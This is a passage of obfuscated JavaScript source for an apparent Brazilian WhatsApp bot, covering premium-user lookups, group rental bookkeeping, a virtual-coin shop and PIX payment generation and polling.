                var _0xddc781 = _0x2144e8;
                premium.push(_0xddc781);
                fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                fs.writeFileSync(_0x1ed4d5, JSON.stringify(_0xddc781, null, 2));
                const _0xbe3776 = "*boa chefe passando para avisar que você está na lista de premium permanente 🥳*";
                const _0x1b466d = {
                  text: _0xbe3776
                };
                _0x263319.sendMessage(_0x578612, _0x1b466d);
                return _0x403602("*pronto chefe. você foi adicionado a lista de usuários premium*");
              }
              break;
            case "vervip":
              {
                if (!_0x38b1b5) {
                  return _0x403602(enviar.msg.premium);
                }
                try {
                  mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid;
                  blu = mentioned;
                  if (!blu) {
                    return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " @User");
                  }
                  const _0x5e1083 = {
                    text: "🔎",
                    key: _0x302296.key
                  };
                  const _0x37161c = {
                    react: _0x5e1083
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x37161c);
                  var _0x2e1106 = "./DADOS/" + blu[0].split("@")[0] + ".json";
                  var _0x3d55ad = "./DADOS/usuarios/logins/" + blu[0].split("@")[0] + ".json";
                  if (fs.existsSync(_0x2e1106)) {
                    var _0x11db8f = JSON.parse(fs.readFileSync(_0x3d55ad, "utf8"));
                    var _0x54a388 = JSON.parse(fs.readFileSync(_0x2e1106, "utf-8"));
                    let _0x13ac02 = "ℹ️ *Usuário Premium* ℹ️\n\n👤 *Nome:* " + _0x11db8f.nome + "\n☎️ *Número:* " + _0x54a388.id + "\n🧸 *Tipo:* " + _0x54a388.tipo;
                    if (_0x54a388.tipo.toLowerCase() !== "permanente") {
                      const _0x120b0f = moment.tz(_0x54a388.dataExpiracao, "DD/MM HH:mm").format("DD/MM [às] HH:mm");
                      _0x13ac02 += "\n*⌛ Data de Expiração:* " + _0x120b0f;
                    }
                    const _0x262a17 = {
                      text: "💎",
                      key: _0x302296.key
                    };
                    const _0x4cc8ba = {
                      react: _0x262a17
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x4cc8ba);
                    const _0x4940c5 = {
                      text: _0x13ac02
                    };
                    const _0x2d765c = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x4940c5, _0x2d765c);
                  } else {
                    return _0x403602("O número de telefone especificado não está na lista premium.");
                  }
                } catch (_0x1cc4f4) {
                  console.log(_0x1cc4f4);
                }
              }
              break;
            case "vervipp":
              {
                if (!_0x38b1b5) {
                  return _0x403602(enviar.msg.premium);
                }
                try {
                  blu = _0x1d6557;
                  if (!blu) {
                    return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " 553299240466");
                  }
                  const _0x324f5f = {
                    text: "🔎",
                    key: _0x302296.key
                  };
                  const _0x26431f = {
                    react: _0x324f5f
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x26431f);
                  var _0x2e1106 = "./DADOS/" + blu + ".json";
                  var _0x3d55ad = "./DADOS/" + blu + ".json";
                  if (fs.existsSync(_0x2e1106)) {
                    var _0x11db8f = JSON.parse(fs.readFileSync(_0x3d55ad, "utf8"));
                    var _0x54a388 = JSON.parse(fs.readFileSync(_0x2e1106, "utf-8"));
                    let _0x4439c8 = "ℹ️ *Usuário Premium* ℹ️\n\n☎️ *Número:* " + _0x54a388.id + "\n🧸 *Tipo:* " + _0x54a388.tipo;
                    if (_0x54a388.tipo.toLowerCase() !== "permanente") {
                      const _0x194275 = moment(_0x54a388.dataExpiracao, "DD/MM HH:mm").format("DD/MM [às] HH:mm");
                      _0x4439c8 += "\n*⌛ Data de Expiração:* " + _0x194275;
                    }
                    const _0x5802ae = {
                      text: "💎",
                      key: _0x302296.key
                    };
                    const _0x46fb10 = {
                      react: _0x5802ae
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x46fb10);
                    const _0xe77f64 = {
                      text: _0x4439c8
                    };
                    const _0x14d67c = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0xe77f64, _0x14d67c);
                  } else {
                    return _0x403602("O número de telefone especificado não está na lista premium.");
                  }
                } catch (_0x4712e8) {
                  console.log(_0x4712e8);
                }
              }
              break;
            case "infopremium":
            case "infovip":
            case "tp":
              {
                const _0x528eaf = {
                  text: "🔎",
                  key: _0x302296.key
                };
                const _0x43bead = {
                  react: _0x528eaf
                };
                await _0x263319.sendMessage(_0x4f1071, _0x43bead);
                if (_0x2f2081 === "sim") {
                  if (fs.existsSync(_0x1ed4d5)) {
                    const _0x37199b = JSON.parse(fs.readFileSync(_0x1ed4d5, "utf-8"));
                    let _0x45f3e0 = "💎「 *INFO PREMIUM* 」💎\n\n👤 *Usuário*: " + _0x55a6ac + "\n☎️ *Número*: " + _0x578612 + "\n🧸 *Tipo*: " + _0x37199b.tipo + "\n";
                    if (_0x37199b.tipo === "mensal" || _0x37199b.tipo === "diario" || _0x37199b.tipo === "semanal") {
                      const _0x4897f7 = moment(_0x37199b.dataExpiracao, "DD/MM HH:mm").format("DD/MM [às] HH:mm");
                      _0x45f3e0 += "⌛ *Data de Expiração:* " + _0x4897f7;
                    }
                    const _0x1ba3ba = {
                      text: "💎",
                      key: _0x302296.key
                    };
                    const _0x1b0949 = {
                      react: _0x1ba3ba
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x1b0949);
                    const _0x182764 = {
                      text: _0x45f3e0
                    };
                    const _0x290e38 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x182764, _0x290e38);
                  } else {
                    const _0x4f62a7 = {
                      text: "❓",
                      key: _0x302296.key
                    };
                    const _0x3b51c0 = {
                      react: _0x4f62a7
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x3b51c0);
                    const _0x2ba429 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      text: "Você é premium, mais não acho seu arquivo, fale com meu pai: wa.me/553299240466?text=deu+um+erro+no+comando+infovip"
                    }, _0x2ba429);
                  }
                } else {
                  const _0x269ee5 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x3702f7 = {
                    react: _0x269ee5
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x3702f7);
                  const _0x3c2aa6 = {
                    text: "Esse comando é exclusivo para usuários Vip.\nCaso queria ser vip, digite \"" + _0x1d93be + "lojavip\"."
                  };
                  const _0x47c033 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x3c2aa6, _0x47c033);
                }
              }
              break;
            case "premiumlist":
              if (!_0x38b1b5) {
                return _0x403602(enviar.msg.premium);
              }
              let _0x3bf054 = "👑 *Lista de Usuários Premium* 👑\n\n";
              for (const _0x3b47b3 of premium) {
                if (_0x3b47b3.id && _0x3b47b3.tipo) {
                  const _0x13cae8 = _0x3b47b3.id;
                  const _0x443942 = _0x3b47b3.tipo;
                  _0x3bf054 += "📱 *Número do Usuário*: " + _0x13cae8 + "\n🌟 *Tipo de Premium*: " + _0x443942 + "\n\n";
                }
              }
              if (premium.length === 0) {
                _0x3bf054 = "Nenhum usuário premium na lista.";
              }
              return _0x403602(_0x3bf054);
              break;
            case "addrent":
            case "rgrent":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                if (!_0x1d6557.includes("/")) {
                  return _0x403602("Você vai colocar o número da pessoa que alugou e após isso uma barra ( / ). Após a barra, coloque a quantidade de dias que este alugou para seu grupo. Ex:\n" + (_0x1d93be + _0x3dec88) + " " + _0x3a52d1.split("@")[0] + "/30");
                }
                barra = _0x1d6557.replace(" /", "/").replace("/ ", "/").replace(" / ", "/");
                var [_0x3e1adf, _0x1b474e] = barra.split("/");
                if (!Number(_0x1b474e)) {
                  return _0x403602("Apenas números pfvr");
                }
                jeffinho = _0x3e1adf.includes("@") ? _0x3e1adf.split("@")[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x3e1adf.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
                const [_0xacdf7] = await _0x263319.onWhatsApp(jeffinho.split("@")[0]);
                if (_0xacdf7 == undefined) {
                  return _0x403602("O número " + jeffinho.split("@")[0] + " não é válido no whatsapp");
                }
                if (Number(_0x1b474e) <= 0) {
                  return _0x403602("É necessário ao menos 1 dia de aluguel né");
                }
                if (_0x1b474e.includes(".")) {
                  return _0x403602("Não use números decimais");
                }
                _0x1e3043.push({
                  id: _0x4f1071,
                  nome: _0x471350,
                  tempo: Number(_0x1b474e) + 1,
                  totalRent: Number(_0x1b474e) + 1,
                  cliente: jeffinho,
                  save: Number(moment.tz("America/Sao_Paulo").format("DD")),
                  cortesia: false
                });
                fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                _0x403602("*Grupo adicionado ao aluguel com sucesso* ✅");
              } else {
                if (!Number(_0x40e45c[0])) {
                  return _0x403602("Coloque quantos dias mais serão adicionados ao aluguel deste grupo...");
                }
                hehe = Number(_0x40e45c[0]);
                _0x3529b0 = _0x1e3043.map(_0x5568b4 => _0x5568b4.id).indexOf(_0x4f1071);
                _0x1e3043[_0x3529b0].cortesia = false;
                _0x1e3043[_0x3529b0].nome = _0x471350;
                _0x1e3043[_0x3529b0].totalRent = _0x1e3043[_0x3529b0].tempo + hehe;
                _0x1e3043[_0x3529b0].tempo += hehe;
                fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                _0x403602("+" + _0x40e45c[0] + " dia" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " adicionado" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " para este grupo");
              }
              break;
            case "tirarrent":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602("Apenas números pfvr");
              }
              if (!JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                return _0x403602("ID inexistente");
              }
              _0x3529b0 = _0x1e3043.map(_0x37efe4 => _0x37efe4.id).indexOf(_0x4f1071);
              _0x1e3043[_0x3529b0].cortesia = false;
              _0x1e3043[_0x3529b0].nome = _0x471350;
              _0x1e3043[_0x3529b0].tempo -= Number(_0x40e45c[0]);
              fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
              _0x403602(_0x40e45c[0] + " dia" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " fo" + (Number(_0x40e45c[0]) > 1 ? "ram" : "i") + " retirado" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " deste grupo");
              break;
            case "delrent":
            case "rmrent":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x1d6557) {
                if (!JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                  return _0x403602("ID inexistente");
                }
                _0x3529b0 = _0x1e3043.map(_0xe2c231 => _0xe2c231.id).indexOf(_0x4f1071);
                _0x1e3043.splice(_0x3529b0, 1);
                fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                _0x403602("Registro desse grupo deletado com sucesso 📍");
              } else {
                if (!Number(_0x40e45c[0]) || Number(_0x40e45c[0]) < 0 || Number(_0x40e45c[0]) > Number(_0x1e3043.length + 1)) {
                  return _0x403602("Retorne um número válido... Olhe na " + _0x1d93be + "listrent e veja o número");
                }
                BC = Number(_0x40e45c[0]) - 1;
                _0x1e3043.splice(BC, 1);
                fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                _0x403602("Registro desse grupo deletado com sucesso 📍");
              }
              break;
            case "cortesia24":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                return _0x403602("Grupo já registrado");
              }
              _0x1e3043.push({
                id: _0x4f1071,
                nome: _0x471350,
                tempo: 24,
                totalRent: 24,
                cliente: _0x3a52d1,
                save: Number(moment.tz("America/Sao_Paulo").format("mm")),
                cortesia: true
              });
              fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
              _0x403602("💵 Cartão verde validado ✅\n24h liberadas neste grupo contando a partir de agora ⏲️");
              break;
            case "cortesia48":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                return _0x403602("Grupo já registrado");
              }
              _0x1e3043.push({
                id: _0x4f1071,
                nome: _0x471350,
                tempo: 48,
                totalRent: 48,
                cliente: _0x3a52d1,
                save: Number(moment.tz("America/Sao_Paulo").format("mm")),
                cortesia: true
              });
              fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
              _0x403602("💶 Cartão azul validado ☑️\n48h liberadas neste grupo contando a partir de agora ⏲️");
              break;
            case "listrent":
            case "lista_aluguel":
            case "lista-aluguel":
              if (!_0x2a5ff3) {
                return _0x403602(enviar.msg.grupo);
              }
              if (_0x1e3043.length > 0) {
                var _0x2b89ea = await _0x263319.groupFetchAllParticipating();
                var _0xe96608 = Object.entries(_0x2b89ea).slice(0).map(_0x5a95a8 => _0x5a95a8[1]);
                var _0x422420 = _0xe96608.map(_0x201c77 => _0x201c77);
                _0x422420.sort((_0x40af68, _0x27aa36) => _0x40af68[0] < _0x27aa36.length);
                for (g = 0; g < _0x422420.length; g++) {
                  if (JSON.stringify(_0x1e3043).includes(_0x422420[g].id)) {
                    jeffinhoooo = _0x1e3043.map(_0x7f86c5 => _0x7f86c5.id).indexOf(_0x422420[g].id);
                    _0x1e3043[jeffinhoooo].nome = _0x422420[g].subject;
                    fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                  }
                }
                txt = "⏤͟͟͞͞ ꦿ𝙻𝚒𝚜𝚝𝚊 𝙳𝚎 𝙶𝚛𝚞𝚙𝚘𝚜 𝙰𝚕𝚞𝚐𝚊𝚍𝚘𝚜 ↴\n▧⃯⃟𝚃𝚘𝚝𝚊𝚕〘 " + _0x1e3043.length + " 〙\n________________________________________\n";
                for (_0xc3d45a = 0; _0xc3d45a < _0x1e3043.length; _0xc3d45a++) {
                  hmm = _0x1e3043[_0xc3d45a].tempo;
                  txt += "『 " + (_0xc3d45a + 1) + " 』\n⏤͟͟͞͞ ꦿ𝙶𝚛𝚞𝚙𝚘: " + _0x1e3043[_0xc3d45a].nome + "\n";
                  if (_0x1e3043[_0xc3d45a].cortesia == false) {
                    txt += "ㅤㅤ⏤͟͟͞͞ ꦿ𝚃𝚎𝚖𝚙𝚘 𝚁𝚎𝚜𝚝𝚊𝚗𝚝𝚎: " + hmm + " dia" + (hmm > 1 ? "s" : "") + "\nㅤ⸺͟͞ꪶ𝙲𝚕𝚒𝚎𝚗𝚝𝚎: wa.me/" + _0x1e3043[_0xc3d45a].cliente.split("@")[0] + "\n________________________________________\n";
                  } else {
                    txt += "🔌 ＣＡＲＴÃＯ ＣＯＲＴＥＳＩＡ 🖲️\n________________________________________\n";
                  }
                }
                _0x403602(txt);
              } else {
                _0x403602("Nenhum grupo adicionado");
              }
              break;
            case "calendario":
            case "tempogp":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "📅");
              }, 300);
              try {
                const _0x3fd10b = await _0x263319.groupFetchAllParticipating();
                const _0x4701cd = Object.values(_0x3fd10b);
                const _0x24be56 = moment.tz().tz("America/Sao_Paulo").format("HH:mm");
                const _0x52ce82 = moment.tz().tz("America/Sao_Paulo").format("DD/MM");
                const _0x2159d8 = "\n*" + _0x6965b0.toUpperCase() + "*\n👤 " + _0x55a6ac + "\n\n👥 *GRUPO:* " + (_0xd20756 ? _0x471350 : "privado") + "\n📆 *DATA:* " + _0x52ce82 + "\n⏰ *HORA:* " + _0x24be56 + "H\n🤖 *BOT:* " + NomeDoBot + "\n👑 *DONO:* " + NickDono + "\n\n📠 _Operando em " + _0x4701cd.length + " grupos_\n";
                if (JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                  const _0x41e243 = _0x1e3043.findIndex(_0x30939f => _0x30939f.id === _0x4f1071);
                  if (_0x41e243 !== -1) {
                    let _0x2bf2ea = _0x1e3043[_0x41e243].tempo / _0x1e3043[_0x41e243].totalRent * 100;
                    let _0x4b1f14 = "";
                    if (_0x2bf2ea < 10) {
                      _0x4b1f14 = _0x2bf2ea.toFixed(0) + "%〘▒▒▒▒▒▒▒▒▒▒〙";
                    } else if (_0x2bf2ea >= 95) {
                      _0x4b1f14 = _0x2bf2ea.toFixed(0) + "%〘██████████〙";
                    } else {
                      _0x4b1f14 = _0x2bf2ea.toFixed(0) + "%〘" + "█".repeat(Math.floor(_0x2bf2ea / 10)) + "▒" + "▒".repeat(10 - Math.floor(_0x2bf2ea / 10)) + "〙";
                    }
                    let _0x35dd59 = "";
                    if (_0x1e3043[_0x41e243].cliente == _0x32e455 || _0x2a5ff3) {
                      _0x35dd59 = "\n»⟩ ";
                      if (_0x1e3043[_0x41e243].cortesia == false) {
                        _0x35dd59 += _0x1e3043[_0x41e243].tempo + " dia" + (_0x1e3043[_0x41e243].tempo > 1 ? "s" : "") + " restantes";
                      } else {
                        _0x35dd59 += _0x1e3043[_0x41e243].tempo > 1 ? _0x1e3043[_0x41e243].tempo + " horas" : "Alguns minutos";
                      }
                      _0x35dd59 += " até o fim do contrato ⟨«";
                    }
                    _0x403602(_0x2159d8 + "\n🔋 *Bateria restante para uso ↴*\n-> " + _0x4b1f14 + " " + _0x35dd59);
                  }
                } else {
                  _0x403602("" + _0x2159d8);
                }
              } catch (_0x87bb94) {
                console.error("Error':", _0x87bb94);
                _0x403602("Ocorreu um erro ao processar o comando. Por favor, tente novamente mais tarde.");
              }
              break;
            case "infoalugar":
            case "botentra":
            case "botentra":
            case "planos":
            case "add_botgp":
              _0x403602(_0x6965b0 + " " + _0x55a6ac + ", perdido de como funciona o novo sistema de moedas virtuais? Chega mais 🤭\n\n*> " + _0x1d93be + "recarga*\nNo comando " + _0x1d93be + "recarga você poderá escolher o valor de moedas a serem adicionadas em sua conta... Tais moedas poderão ser usadas na " + _0x1d93be + "loja\n\n*> " + _0x1d93be + "loja*\nA loja mostrará os valores de aluguéis e outros disponíveis... Para obter os mesmos será necessário o uso das moedas virtuais em sua conta.\n\n*> " + _0x1d93be + "buygp*\nCaso se veja interessado em alugar o bot para o seu grupo, use o comando " + _0x1d93be + "buygp com o link do grupo logo depois... O bot lhe enviará uma chave de acesso, para ativar os sistemas em seu grupo.\n\n*> " + _0x1d93be + "transferirgp*\nCaso você queira transferir o bot de um grupo para o outro, use esse comando com o novo link do grupo.\n\n*> " + _0x1d93be + "buykeygp*\nFunciona quase da mesma forma que o buygp, única diferença que aqui não é necessário o link do grupo... Útil para caso vc queira apenas renovar o contrato de aluguel.\n\n*> " + _0x1d93be + "reembolsar*\nUse esse comando para ressarcir o valor gasto na compra da Key\n\n*> " + _0x1d93be + "minhaskey*\nAqui você poderá ver quais keys vc comprou");
              break;
            case "alugueis":
            case "alugar":
            case "alugarbot":
            case "alugarxbot":
            case "loja":
              {
                _0x1b86ad(_0x4f1071, "🛒");
                moneybot = TabelaAluguel(_0x1d93be, _0x32e455);
                const _0x470bdf = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: moneybot,
                  contextInfo: {
                    externalAdReply: {
                      title: "👑⟩ " + NickDono,
                      body: "🤖⟩ " + NomeDoBot,
                      thumbnail: await getBuffer("https://telegra.ph/file/beb6cf4ceca90abaaa480.jpg"),
                      mediaType: 1,
                      showAdAttribution: true,
                      sourceUrl: "https://wa.me/" + _0x3a52d1.split("@")[0]
                    }
                  }
                }, _0x470bdf);
                await sleep(3000);
                if (botoes_) {
                  const _0x3c80a7 = {
                    text: "\n❪🍧ฺ࣭࣪͘ꕸ▸ Digite *" + _0x1d93be + "buykeygp* para alugar*"
                  };
                  const _0x480f30 = {
                    display_text: "»⟩ MAIS INFORMAÇÕES ⟨«",
                    id: _0x1d93be + "infoalugar"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x3c80a7,
                      footer: {
                        text: ""
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify(_0x480f30)
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x1935ea = {
                    text: "❪🍧ฺ࣭࣪͘ꕸ▸ Digite *" + _0x1d93be + "buykeygp* para alugar*\nPara mais informações, digite *" + _0x1d93be + "infoalugar*"
                  };
                  const _0x52a006 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x1935ea, _0x52a006);
                }
              }
              break;
            case "recarga":
              {
                if (botoes_) {
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "»⟩ 𝗧𝗮𝗯𝗲𝗹𝗮 𝗱𝗲 𝗥𝗲𝗰𝗮𝗿𝗴𝗮𝘀 𝗗𝗶𝘀𝗽𝗼𝗻í𝘃𝗲𝗶𝘀 ⟨«"
                      },
                      footer: {
                        text: "❪🍧ฺ࣭࣪͘ꕸ▸ Escolha o número correspondente ao valor da recarga que você quer... Após efetuado o pagamento, vc receberá em sua conta da Robot Banc o valor das moedas correspondente a recarga."
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "░ ABRIR ░",
                            sections: [{
                              title: "Recargas",
                              rows: [{
                                id: _0x1d93be + "recarregar 1",
                                title: TituloAluguel1(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel1(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "recarregar 2",
                                title: TituloAluguel2(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel2(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "recarregar 3",
                                title: TituloAluguel3(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel3(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "recarregar 4",
                                title: TituloAluguel4(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel4(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "recarregar 5",
                                title: TituloAluguel5(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel5(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "recarregar 6",
                                title: TituloAluguel6(_0x1d93be, _0x32e455),
                                description: SubtituloAluguel6(_0x1d93be, _0x32e455)
                              }]
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x49c022 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "»⟩ 𝗧𝗮𝗯𝗲𝗹𝗮 𝗱𝗲 𝗥𝗲𝗰𝗮𝗿𝗴𝗮𝘀 𝗗𝗶𝘀𝗽𝗼𝗻í𝘃𝗲𝗶𝘀 ⟨«\n\n❪🍧ฺ࣭࣪͘ꕸ▸" + TabelaAluguel(_0x1d93be, _0x32e455) + "\n Escolha o número correspondente ao valor da recarga que você quer... \n      EX: " + _0x1d93be + "recarregar 1\n      \n      ira gerar o pagamento de 5 reais (15 dias) \n      Após efetuado o pagamento, vc receberá em sua conta da Robot Banc o valor das moedas correspondente à recarga."
                  }, _0x49c022);
                }
              }
              break;
            case "recarregar":
              try {
                if (!_0x4c107d.some(_0x549fa => _0x549fa.id === "Jeffinho")) {
                  _0x4c107d.push({
                    id: "Jeffinho",
                    chaves: []
                  });
                  fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                }
                if (!_0x4c107d.some(_0x47bc65 => _0x47bc65.id === _0x32e455)) {
                  let _0x26a6ec = Number(moment.tz("America/Sao_Paulo").format("HHmmss")) + Number(moment.tz("America/Sao_Paulo").format("DDMMYY"));
                  _0x26a6ec *= Number(_0x32e455.slice(4, 10));
                  _0x4c107d.push({
                    id: _0x32e455,
                    saldo: 0,
                    UID: _0x26a6ec,
                    rg: moment.tz("America/Sao_Paulo").format("DD-MM-20YY"),
                    cortesia: 2,
                    mm: moment.tz("America/Sao_Paulo").format("MM")
                  });
                  fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                }
                if (!_0x40e45c[0] || !Number(_0x40e45c[0]) || Number(_0x40e45c[0]) < 1 || Number(_0x40e45c[0]) > 6) {
                  _0x403602(_0x6965b0 + " " + _0x55a6ac + ", vejo que você não escolheu o valor da recarga corretamente... Irei te mandar a tabela abaixo ↴");
                  if (_0x40e45c[0] && _0x40e45c[0].includes(".")) {
                    return _0x403602("Não pode usar números decimais...");
                  }
                  await sleep(500);
                  return _0x403602("*_»⟩Tabela de recargas disponíveis ⟨«_*\n\n❪🍧ฺ࣭࣪͘ꕸ▸ _Escolha o número correspondente ao valor da recarga que você quer *(ex: " + (_0x1d93be + _0x3dec88) + " 1)*... Após efetuado o pagamento, você receberá em sua conta da Robot Banc o valor das moedas correspondente a recarga._\n\n" + TabelaAluguel(_0x1d93be, _0x32e455) + "\n\n𖥨ํ∘̥⃟⸽⃟💌৴▸ _Lembrando que essa recarga não está vinculada a compra de nenhum produto no bot, com exceção das moedas... Tais moedas após compradas poderão ser usadas para afins como aluguéis de grupos e outros. Para mais informações, veja *" + _0x1d93be + "infoalugar*_");
                }
                const _0x4eccdf = {
                  1: {
                    preco: "" + preço1(_0x1d93be, _0x32e455),
                    bonus: 0.5
                  },
                  2: {
                    preco: "" + preço2(_0x1d93be, _0x32e455),
                    bonus: 1
                  },
                  3: {
                    preco: "" + preço3(_0x1d93be, _0x32e455),
                    bonus: 2
                  },
                  4: {
                    preco: "" + preço4(_0x1d93be, _0x32e455),
                    bonus: 3
                  },
                  5: {
                    preco: "" + preço5(_0x1d93be, _0x32e455),
                    bonus: 4
                  },
                  6: {
                    preco: 150,
                    bonus: 5
                  }
                };
                const _0x2bd5e3 = Number(_0x40e45c[0]);
                const _0x2493d6 = _0x4eccdf[_0x2bd5e3] ? _0x4eccdf[_0x2bd5e3].preco : 0.5;
                const _0x11e3bf = _0x4eccdf[_0x2bd5e3] ? _0x4eccdf[_0x2bd5e3].bonus : 0;
                let _0x19caa6 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + _0x2493d6 + "&apikey=" + _0x512d5e);
                let _0x32fc4f = await _0x19caa6.json();
                if (!_0x32fc4f.status) {
                  throw new Error("Falha ao gerar informações de pagamento");
                }
                const _0x185168 = {
                  upload: _0x263319.waUploadToServer
                };
                let _0x61a71b = await prepareWAMessageMedia({
                  image: Buffer.from(_0x32fc4f.qr_code, "base64")
                }, _0x185168);
                const _0x30503c = "Lembrando que você tem 5 minutos para efetuar o pagamento... Caso exceda o tempo, há possibilidade do sistema não contabilizar as moedas.\n\nDestinatario: " + _0x32fc4f.destinatario + "\n\nValor: R$ " + _0x2493d6 + ",00 \n\nQualquer dúvida, chame meu dono...\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.\n        abaixo o código pix ";
                if (botoes_) {
                  const _0x46e70e = {
                    hasMediaAttachment: true,
                    imageMessage: _0x61a71b.imageMessage
                  };
                  const _0x2d9899 = {
                    text: _0x30503c
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      header: _0x46e70e,
                      headerType: "IMAGE",
                      body: _0x2d9899,
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_copy",
                          buttonParamsJson: JSON.stringify({
                            display_text: "COPIAR CHAVE PIX",
                            id: "sim",
                            copy_code: "" + _0x32fc4f.chave
                          })
                        }, {
                          name: "cta_url",
                          buttonParamsJson: JSON.stringify({
                            display_text: "⟩ DONO ⟨",
                            merchant_url: "https://wa.me/+" + _0x3a52d1 + "?text=Olá, preciso de ajuda sobre o " + NomeDoBot,
                            url: "https://wa.me/+" + _0x3a52d1 + "?text=Olá, preciso de ajuda sobre o " + NomeDoBot
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x341620 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    image: Buffer.from(_0x32fc4f.qr_code, "base64"),
                    caption: _0x30503c,
                    mentions: [_0x32e455]
                  }, _0x341620).then(() => _0x403602("" + _0x32fc4f.chave));
                }
                const _0x2bf2f3 = 600000;
                const _0x33cf79 = Date.now();
                let _0x326ef6;
                do {
                  let _0x1afd71 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x32fc4f.id + "&apikey=" + _0x512d5e);
                  _0x326ef6 = await _0x1afd71.json();
                  if (_0x326ef6.status_pagamento === "pending") {
                    await sleep(30000);
                    if (Date.now() - _0x33cf79 > _0x2bf2f3) {
                      throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                    }
                  }
                } while (_0x326ef6.status_pagamento === "pending");
                if (_0x326ef6.status_pagamento === "approved") {
                  let _0x379ac4 = _0x2493d6 + _0x11e3bf;
                  let _0x336dd0 = _0x4c107d.findIndex(_0x117ac9 => _0x117ac9.id === _0x32e455);
                  _0x4c107d[_0x336dd0].saldo += _0x379ac4;
